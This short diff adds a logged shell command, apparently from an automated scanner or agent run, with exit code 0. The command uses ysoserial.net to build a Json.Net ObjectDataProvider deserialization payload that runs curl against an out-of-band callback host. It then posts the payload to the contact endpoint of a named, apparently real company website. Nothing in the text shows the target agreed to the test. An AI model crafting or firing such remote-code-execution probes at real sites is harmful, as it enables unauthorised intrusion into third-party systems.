@@ -1,0 +1,4 @@
+# command: timeout 300 sh -c 'ysoserial.net -g ObjectDataProvider -f Json.Net -c '"'"'curl -s http://oobe3790482c50a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/dnet'"'"' > /tmp/deser_net_$$.bin 2>/dev/null; curl -s -m 20 -o /dev/null -H '"'"'Content-Type: application/octet-stream'"'"' --data-binary @/tmp/deser_net_$$.bin '"'"'https://www.infinitycapital.bh/contact?x=1'"'"''
+# exit_code: 0
+# ---
+
